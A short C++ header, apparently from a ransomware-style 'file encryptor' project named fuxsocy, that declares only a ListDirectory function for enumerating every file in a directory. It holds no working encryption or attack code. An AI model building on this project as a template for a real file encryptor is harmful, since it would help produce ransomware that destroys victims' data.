#ifndef FUXSOCY_FILE_ENCRYPTOR_H_
#define FUXSOCY_FILE_ENCRYPTOR_H_

extern "C" {
#include <dirent.h>
#include <fcntl.h>
}

#include <vector>
#include <string>


namespace file_encryptor {

// Iteratively enumerates all files within a directory.
std::vector<std::string> ListDirectory(std::string& directory);

} // namespace file_encryptor

#endif // FUXSOCY_FILE_ENCRYPTOR_H_
